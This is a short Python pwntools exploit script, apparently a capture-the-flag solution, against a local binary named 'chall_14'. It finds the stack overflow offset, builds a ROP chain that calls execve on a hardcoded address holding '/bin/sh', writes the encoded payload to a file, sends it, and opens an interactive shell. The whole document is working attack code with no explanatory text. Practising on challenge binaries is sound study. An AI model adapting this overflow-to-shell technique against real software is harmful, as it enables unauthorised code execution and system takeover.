from pwn import *

context.arch = 'amd64'

sh = process('./chall_14')

p1 = 'abc'

padding = cyclic_find(0x62616162)
print('padding:', padding)

binary = ELF('chall_14')
rop = ROP(binary)
binsh = 0x7fffffffd3c0
rop.execve(binsh, 0, 0)
print(rop.dump())

payload = b'/bin/sh\0'.ljust(padding, b'B')
payload += rop.chain()
payload = encoder.line(payload)

with open('payload', 'w') as f:
    f.write(p1 + "\n")

with open('payload', 'ab') as f:
    f.write(payload)

sh.recvline()
sh.sendline(p1)

sh.sendline(payload)
sh.interactive()
